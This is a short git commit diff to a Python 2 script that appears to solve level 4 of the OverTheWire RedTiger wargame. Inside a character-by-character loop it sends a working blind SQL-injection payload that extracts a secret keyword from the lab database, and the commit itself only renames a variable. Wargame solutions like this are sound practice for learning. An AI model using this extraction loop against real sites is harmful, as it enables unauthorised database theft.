dcd397252fa6403761f8d038db2d0b207a193ee9
hangockhue <healwayhappy@gmail.com>
2017-01-16 09:36:21 +0700

    Update python lv4 url.py

--- python lv4 url.py
+++ python lv4 url.py
@@ -4,8 +4,8 @@ word = ""
 for a in range(1,22):
   for b in range(33,123):
     url = "http://redtiger.labs.overthewire.org/level4.php?id=1%20and%20ascii(substring((select%20keyword%20FROM%20level4_secret)" + ",%d,1))=%d-- -"%(a,b) 
-    req = urllib2.Request(url,"",headers)
-    source = urllib2.urlopen(req).read()
+    request = urllib2.Request(url,None,headers)
+    source = urllib2.urlopen(request).read()
     if "1 rows" in source:
       word = word + chr(b)
       print chr(b)
